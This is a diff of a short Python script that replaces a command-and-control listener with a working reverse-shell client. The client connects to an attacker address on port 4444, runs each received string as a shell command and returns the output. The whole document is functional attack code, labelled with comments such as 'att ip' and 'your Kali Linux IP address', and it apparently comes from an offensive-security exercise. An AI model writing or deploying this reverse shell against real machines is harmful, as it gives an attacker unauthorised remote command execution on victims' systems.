@@ -1,27 +1,35 @@
-
 #!/usr/bin/python
 
+import subprocess
 import socket
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-
-s.bind(("192.168.1.7" , 4444))  # first parameter is your Kali Linux IP address
-s.listen(5)
-
-print("[+] Listening For Incoming Connections")
-
-target,ip = s.accept()
-print("[+] Target Connected!")
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect(("10.0.0.67", 4444))  #att ip
 
 
 while True:
-	command = input("* Shell#~%s: " % str(ip))
-	target.send(command.encode())
+	data = sock.recv(2048)
+	if not data:
+		break
+
+	# decode safely and normalize the command
+	command = data.decode(errors='ignore').strip()
+
 	if command == "q":
 		break
-	result = target.recv(2048).decode()
-	print(result)
+	if not command:
+		# ignore empty commands
+		continue
 
-target.close()
-s.close()
+	proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+	# read stdout and stderr bytes and send them back
+	command_result = proc.stdout.read() + proc.stderr.read()
+	# ensure we send some bytes back
+	if not command_result:
+		command_result = b'\n'
+	try:
+		sock.sendall(command_result)
+	except BrokenPipeError:
+		break
+
+sock.close()
